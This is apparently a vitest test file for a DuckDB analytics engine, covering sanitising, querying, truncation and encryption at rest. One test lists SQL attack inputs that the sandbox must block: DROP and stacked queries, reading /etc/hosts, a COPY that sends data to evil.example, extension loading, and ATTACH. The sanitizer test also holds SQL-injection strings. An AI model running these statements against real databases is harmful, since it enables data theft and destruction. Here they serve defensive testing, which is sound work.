// Engine tests. WorkDir is read once at config module load, so DHOW_WORKDIR
// must be set BEFORE the engine module is imported: everything here goes
// through dynamic import for that reason.

import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

type EngineModule = typeof import('./engine.js');

let mod: EngineModule;
let workdir: string;

beforeAll(async () => {
    workdir = fs.mkdtempSync(path.join(os.tmpdir(), 'dhow-engine-'));
    process.env.DHOW_WORKDIR = workdir;
    process.env.DHOW_DATA_KEY = 'test-key-engine';
    mod = await import('./engine.js');
});

afterAll(async () => {
    await mod.closeAllEngines();
    fs.rmSync(workdir, { recursive: true, force: true });
    delete process.env.DHOW_DATA_KEY;
});

describe('sanitizeTableName', () => {
    it('produces safe identifiers', () => {
        expect(mod.sanitizeTableName('Q1 P&L (final).csv')).toBe('q1_p_l_final_csv');
        expect(mod.sanitizeTableName('2024-sales')).toBe('t_2024_sales');
        expect(mod.sanitizeTableName('  ')).toMatch(/^t_[0-9a-f]{8}$/);
    });

    it('strips characters that could break out of an identifier', () => {
        expect(mod.sanitizeTableName('a"; DROP TABLE x; --')).not.toContain('"');
        expect(mod.sanitizeTableName("a'; DROP TABLE x; --")).not.toContain("'");
    });
});

describe('normalizeValue', () => {
    it('converts BigInt so JSON.stringify cannot throw', () => {
        // COUNT(*) comes back as BigInt and JSON.stringify throws on it. This
        // is the single most likely way a tool result blows up in production.
        expect(mod.normalizeValue(42n)).toBe(42);
        expect(() => JSON.stringify(mod.normalizeValue({ n: 7n }))).not.toThrow();
    });

    it('stringifies BigInt beyond the safe integer range', () => {
        expect(mod.normalizeValue(9007199254740993n)).toBe('9007199254740993');
    });
});

describe('DataEngine', () => {
    it('ingests, profiles, lists and queries a table', async () => {
        const engine = await mod.getEngine('ws1');
        await engine.withWrite(async (c) => {
            await c.run(
                "CREATE TABLE sales AS SELECT * FROM (VALUES ('EMEA', 100.5), ('APAC', 200.25), ('EMEA', 9.25)) t(region, amount)",
            );
            const profile = await engine.profileTable(c, 'sales', {
                sourcePath: '/tmp/sales.csv',
                sourceKind: 'csv',
                notes: [],
            });
            expect(profile.rowCount).toBe(3);
            expect(profile.columns.map((x) => x.name)).toEqual(['region', 'amount']);
            expect(profile.columns[0]?.sample.length).toBeGreaterThan(0);
            await engine.saveProfileWithin(c, profile);
        });

        const listed = await engine.listTables();
        expect(listed.map((p) => p.table)).toContain('sales');

        const res = await engine.query(
            'SELECT region, sum(amount) AS total FROM sales GROUP BY 1 ORDER BY total DESC',
        );
        expect(res.ok).toBe(true);
        if (!res.ok) throw new Error(res.error);
        expect(res.rows).toEqual([
            { region: 'APAC', total: 200.25 },
            { region: 'EMEA', total: 109.75 },
        ]);
    });

    it('recycles the reader so a table written AFTER a query is still visible', async () => {
        // Regression guard for the verified failure mode: a reader attached
        // before a write raises "Table with name b does not exist".
        const engine = await mod.getEngine('ws2');
        await engine.withWrite(async (c) => {
            await c.run('CREATE TABLE first AS SELECT 1 AS a');
        });
        const before = await engine.query('SELECT a FROM first');
        expect(before.ok).toBe(true);

        await engine.withWrite(async (c) => {
            await c.run('CREATE TABLE second AS SELECT 2 AS b');
        });
        const after = await engine.query('SELECT b FROM second');
        expect(after.ok).toBe(true);
        if (!after.ok) throw new Error(after.error);
        expect(after.rows).toEqual([{ b: 2 }]);
    });

    it('blocks every sandbox escape on the query path', async () => {
        const engine = await mod.getEngine('ws3');
        await engine.withWrite(async (c) => {
            await c.run('CREATE TABLE t AS SELECT 1 AS a');
        });

        const attacks: Array<[string, string]> = [
            ['drop', 'DROP TABLE t'],
            ['update', 'UPDATE t SET a = 2'],
            ['create', 'CREATE TABLE evil AS SELECT 1'],
            ['stacked', 'SELECT 1; DROP TABLE t'],
            ['pragma', 'PRAGMA version'],
            ['read local file', "SELECT * FROM read_csv_auto('/etc/hosts')"],
            ['exfiltrate', "COPY t TO 'https://evil.example/x.csv'"],
            ['install', 'INSTALL httpfs'],
            ['load', 'LOAD spatial'],
            ['unlock', 'SET enable_external_access=true'],
            ['attach', "ATTACH '/tmp/other.db' AS o"],
        ];
        for (const [label, sql] of attacks) {
            const r = await engine.query(sql);
            expect(r.ok, `${label} should be blocked`).toBe(false);
        }

        // The table survived every attempt.
        const alive = await engine.query('SELECT a FROM t');
        expect(alive.ok).toBe(true);
    });

    it('truncates oversized results and reports it', async () => {
        const engine = await mod.getEngine('ws4');
        await engine.withWrite(async (c) => {
            await c.run('CREATE TABLE big AS SELECT * FROM range(0, 500) t(i)');
        });
        const r = await engine.query('SELECT i FROM big ORDER BY i', { maxRows: 10 });
        expect(r.ok).toBe(true);
        if (!r.ok) throw new Error(r.error);
        expect(r.rowCount).toBe(10);
        expect(r.truncated).toBe(true);
    });

    it('drops a table and forgets its profile', async () => {
        const engine = await mod.getEngine('ws5');
        await engine.withWrite(async (c) => {
            await c.run('CREATE TABLE gone AS SELECT 1 AS a');
            const p = await engine.profileTable(c, 'gone', {
                sourcePath: '/tmp/gone.csv',
                sourceKind: 'csv',
                notes: [],
            });
            await engine.saveProfileWithin(c, p);
        });
        expect((await engine.listTables()).map((p) => p.table)).toContain('gone');
        await engine.dropTable('gone');
        expect((await engine.listTables()).map((p) => p.table)).not.toContain('gone');
        const r = await engine.query('SELECT a FROM gone');
        expect(r.ok).toBe(false);
    });

    it('refuses to open the store with the wrong encryption key', async () => {
        const engine = await mod.getEngine('ws6');
        await engine.withWrite(async (c) => {
            await c.run('CREATE TABLE secret AS SELECT 42 AS answer');
        });
        await engine.close();

        const original = process.env.DHOW_DATA_KEY;
        process.env.DHOW_DATA_KEY = 'a-completely-different-key';
        try {
            // init() attaches immediately, so the rejection surfaces here
            // rather than on the first write.
            await expect(mod.getEngine('ws6')).rejects.toThrow(
                /encryption key|without a key|Cannot open/i,
            );
        } finally {
            process.env.DHOW_DATA_KEY = original;
        }
    });

    it('does not leave table contents in plaintext on disk', async () => {
        const engine = await mod.getEngine('ws7');
        await engine.withWrite(async (c) => {
            await c.run("CREATE TABLE payroll AS SELECT 'MAGICSALARYTOKEN' AS s");
        });
        await engine.close();
        const bytes = fs.readFileSync(path.join(mod.dataDirFor('ws7'), 'analytics.duckdb'));
        expect(bytes.includes(Buffer.from('MAGICSALARYTOKEN'))).toBe(false);
    });
});
